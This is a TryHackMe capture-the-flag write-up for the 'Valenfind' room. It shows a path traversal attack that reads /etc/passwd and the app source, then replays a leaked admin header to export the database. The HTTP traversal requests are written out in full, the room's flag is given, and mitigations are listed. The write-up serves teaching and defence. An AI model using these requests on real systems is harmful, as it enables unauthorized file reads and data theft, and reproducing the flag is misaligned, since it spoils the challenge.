---
type: resource-note
status: done
created: 2026-02-15
updated: 2026-03-12
tags: [security-writeup, tryhackme, event, web-research]
source: TryHackMe: Love at First Breach 2026: Valenfind
platform: tryhackme
room: Love at First Breach 2026: Valenfind
slug: valenfind
path: TryHackMe/90-events/love-at-first-breach-2026/valenfind.md
topic: 90-events
domain: [web]
skills: [burp-suite, lfi-path-traversal, source-analysis]
artifacts: [lab-notes, pattern-card]
sanitized: true
---

# Love at First Breach 2026: Valenfind

## Summary

* Target: a web app on port `5000` (Flask-like stack inferred from the `Server` header).
* Primary bug class: **Local File Inclusion / Path Traversal** via a template/layout fetch endpoint.
* Pivot: read application source (`/opt/Valenfind/app.py`) to discover an admin export endpoint guarded by a static header token.
* Outcome: download/export the database and extract the room flag.

Flag:

* `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`

## Key Concepts

* Local File Inclusion (LFI, 本地文件包含): the server reads a file path influenced by user input.
* Path Traversal (目录穿越): using `../` to escape an intended directory and reach arbitrary files.
* Source-assisted exploitation: once you can read server files, reading the main app code often reveals secrets, internal routes, and data paths.
* Header-based “auth”: a route protected only by a static header value (API key) is fragile when the key can be leaked.

### 2) Observations from the UI & traffic

* The challenge provides a target URL (sanitized here as `http://TARGET_HOST:5000`).
* I proxied the browser through Burp Suite and interacted with the site (signup and profile browsing).
* A notable clue appears in the `cupid` profile page JavaScript: the theme/layout loader calls an API endpoint with a user-controlled `layout` parameter.

### 3) Attack Surface Mapping

#### 3.1 Service fingerprint

* Port `5000` responds with a server fingerprint:

  * `Server: Werkzeug/3.0.1 Python/3.12.3`

#### 3.2 Theme/layout fetching endpoint

The client-side code calls:

* `GET /api/fetch_layout?layout=<layoutName>`

And includes a comment explicitly pointing to an LFI risk:

```javascript
01 function loadTheme(layoutName) {
02   // Feature: Dynamic Layout Fetching
03   // Vulnerability: 'layout' parameter allows LFI
04   fetch(`/api/fetch_layout?layout=${layoutName}`)
05     .then(r => r.text())
06     .then(html => {
07       const bioText = "I keep the database secure. No peeking.";
08       const username = "cupid";
09       let rendered = html.replace('__USERNAME__', username)
10                          .replace('__BIO__', bioText);
11       document.getElementById('bio-container').innerHTML = rendered;
12     })
13 }
```

### 4) Exploitation Notes

### 4.1 Confirm LFI / path traversal

I sent the API request to Burp Repeater and tested traversal.

Example request (sanitized):

```http
01 GET /api/fetch_layout?layout=../../../../etc/passwd HTTP/1.1
02 Host: TARGET_HOST:5000
03 User-Agent: VALUE_REDACTED
04 Accept: */*
05 Connection: close
```

Result:

* The response returned `/etc/passwd` content, confirming server-side file read.

### 4.2 Read app source for pivots

Next, I attempted to read the main application source:

* `/opt/Valenfind/app.py`

This succeeded via the same endpoint:

```http
01 GET /api/fetch_layout?layout=/opt/Valenfind/app.py HTTP/1.1
02 Host: TARGET_HOST:5000
03 Accept: */*
04 Connection: close
```

### 4.3 Identify the admin database export route

From `app.py`, an admin export endpoint was revealed:

* `GET /api/admin/export_db`

It checks a custom header:

* `X-Valentine-Token: API_KEY_REDACTED`

The code also contained a hardcoded key value:

* `ADMIN_API_KEY = "API_KEY_REDACTED"`

(Any session cookies observed in Burp are omitted here; they are not required to document the core bug chain.)

### 4.4 Export database and extract flag

Using Burp Repeater, I sent:

```http
01 GET /api/admin/export_db HTTP/1.1
02 Host: TARGET_HOST:5000
03 X-Valentine-Token: API_KEY_REDACTED
04 Accept: */*
05 Connection: close
```

Result:

* The server returned an exported SQLite database (download name observed as `valenfind_leak.db`).
* Searching the response content for `THM{` revealed:

  * `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`

## Pattern Cards

### Pattern A: “Template fetch” + user-controlled path

Signal:

* Endpoint shape like `/api/fetch_layout?layout=...`
* Client code or UI exposes “themes/layouts/components” as a file-like resource.

Exploit idea:

* Test for path traversal and absolute paths.

Defender fix (high level):

* Use an allowlist of known template names.
* Resolve paths with a safe join and reject `..`, absolute paths, and path separators.

### Pattern B: Hardcoded secrets in source

Signal:

* Once source is readable, look for `API_KEY`, `SECRET`, `TOKEN`, `DATABASE`, `/admin`, `export`, `backup`.

Exploit idea:

* Replay secret in the intended auth location (header/query), then access the privileged endpoint.

Defender fix (high level):

* Move secrets to environment variables.
* Rotate leaked keys.
* Add real authentication/authorization (server-side identity), not just “a magic header value”.

## Mitigation / Recommendations

* LFI/Traversal:

  * Treat any “file name” input as untrusted.
  * Only serve pre-defined layouts (allowlist), never arbitrary filesystem paths.
  * Consider mapping layout names to IDs (e.g., `layout_id=1,2,3`) and resolve server-side.
* Secret management:

  * Remove hardcoded keys from the repository; store secrets outside the codebase.
  * Rotate tokens when exposure is suspected.
* Admin endpoints:

  * Restrict `/api/admin/*` to authenticated admins.
  * Add rate limiting and audit logging (especially for export/backup endpoints).

## Evidence

* Observed header: `Server: Werkzeug/3.0.1 Python/3.12.3`.
* Confirmed LFI via `/api/fetch_layout?layout=...`.
* Read source file: `/opt/Valenfind/app.py`.
* Found admin export endpoint: `/api/admin/export_db`.
* Found static header token: `X-Valentine-Token: API_KEY_REDACTED`.
* Extracted flag: `THM{v1be_c0ding_1s_n0t_my_cup_0f_t3a}`.

## 8) CN: EN Glossary

* Local File Inclusion (LFI): 本地文件包含 / 任意文件读取
* Path Traversal: 目录穿越 / 路径穿越
* Burp Repeater: Burp 重放器（用于手工改包与重放请求）
* Hardcoded secret: 硬编码密钥/令牌
